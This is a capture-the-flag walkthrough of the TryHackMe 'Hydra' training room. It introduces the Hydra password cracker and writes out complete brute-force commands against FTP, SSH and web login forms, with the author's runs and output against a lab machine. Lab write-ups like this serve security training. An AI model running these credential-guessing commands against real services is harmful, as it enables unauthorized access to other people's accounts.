---
title: TryHackMe Hydra
date: 2021-07-03T20:14:32+05:30
lastmod: 2021-07-03T20:14:32+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: /img/thm.gif

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - hydra

draft: false
description: TryHackMe Room hydra solved by Animesh Roy. this is a walkthough. read more...

---
## Hydra

> Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

## Task 01: Hydra Introduction

Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

### Installing Hydra

If you're using Kali Linux, hydra is pre-installed. Otherwise you can download it here: https://github.com/vanhauser-thc/thc-hydra

---

## Task 02:  Using Hydra

* Hydra Commands

The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

`hydra -l user -P passlist.txt ftp://ip.add.re.ss`

* SSH
  
`hydra -l <username> -P <full path to pass> ip -t 4 ssh`

![hydra-options](https://i.imgur.com/D71vkKM.png)

* Post Web Form
We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

Below is an example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> ip http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

![hydra-web](https://i.imgur.com/vC3ZU4E.png)

### 2.1

Use Hydra to bruteforce molly's web password. What is flag 1?

* CMD to run
  
  ` hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.139.138  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" `

  ```bash
     root@Machine:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt [ip]  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
     Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

     Hydra (http://www.thc.org/thc-hydra) starting at 2021-07-03 15:58:06
     [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
     [DATA] attacking http-post-form://10.10.139.138:80//login:username=^USER^&password=^PASS^:F=incorrect
     [80][http-post-form] host: 10.10.139.138   login: molly   password: ********
     1 of 1 target successfully completed, 1 valid password found
     Hydra (http://www.thc.org/thc-hydra) finished at 2021-07-03 15:58:11
     ```

* use the password and user name to login to website, Flag is in HomePage

### 2.2

Use Hydra to bruteforce molly's SSH password. What is flag 2?

* cmd to run

     ```bash
     root@machine:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.139.138 -t 4 ssh
     Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

     Hydra (http://www.thc.org/thc-hydra) starting at 2021-07-03 16:01:43
     [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
     [DATA] attacking ssh://10.10.139.138:22/
     [22][ssh] host: 10.10.139.138   login: molly   password: *********
     1 of 1 target successfully completed, 1 valid password found
     Hydra (http://www.thc.org/thc-hydra) finished at 2021-07-03 16:02:10
     ```
  
* SSH into the box by running `ssh molly@ip` and use the password you found. flag is in home dir `cat ~/flag2*`

---

<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
